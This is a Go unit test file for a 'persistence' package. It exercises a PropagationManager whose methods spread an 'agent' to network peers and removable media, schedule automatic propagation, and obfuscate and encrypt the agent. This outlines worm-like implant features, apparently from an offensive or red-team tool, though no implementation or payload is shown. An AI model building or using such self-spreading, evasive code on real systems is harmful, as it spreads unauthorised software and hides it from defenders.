package persistence

import (
	"context"
	"log/slog"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPropagationManager(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	
	require.NotNil(t, propagationManager)
	assert.Equal(t, "/path/to/agent", propagationManager.agentPath)
}

func TestPropagateToPeers(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	peerAddresses := []string{"192.168.1.100:8080", "192.168.1.101:8080"}
	
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	
	err := propagationManager.PropagateToPeers(ctx, peerAddresses)
	assert.NoError(t, err)
	
	// Check that there are no active propagations after completion
	active := propagationManager.GetActivePropagations()
	assert.Empty(t, active)
}

func TestDetectRemovableMedia(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	// This test will vary by platform
	// On most systems, it will return an empty list or error
	// We're just testing that it doesn't panic
	assert.NotPanics(t, func() {
		_, _ = propagationManager.detectRemovableMedia()
	})
}

func TestScanAndPropagate(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	
	// This test just verifies the function doesn't panic
	assert.NotPanics(t, func() {
		_ = propagationManager.ScanAndPropagate(ctx)
	})
}

func TestScheduleAutomaticPropagation(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()
	
	// This test just verifies the function doesn't panic
	assert.NotPanics(t, func() {
		propagationManager.ScheduleAutomaticPropagation(ctx, 50*time.Millisecond)
	})
	
	// Give it a moment to run
	time.Sleep(150 * time.Millisecond)
}

func TestObfuscateAgent(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	// This test just verifies the function doesn't panic
	assert.NotPanics(t, func() {
		_ = propagationManager.ObfuscateAgent()
	})
}

func TestEncryptAgent(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	// This test will fail because the agent file doesn't exist
	// but we're testing that it handles the error gracefully
	_, err := propagationManager.EncryptAgent()
	assert.Error(t, err)
}

func TestGetActivePropagations(t *testing.T) {
	logger := slog.Default()
	
	propagationManager := NewPropagationManager(logger, "/path/to/agent", nil, "test-peer")
	require.NotNil(t, propagationManager)
	
	// Initially should be empty
	active := propagationManager.GetActivePropagations()
	assert.Empty(t, active)
}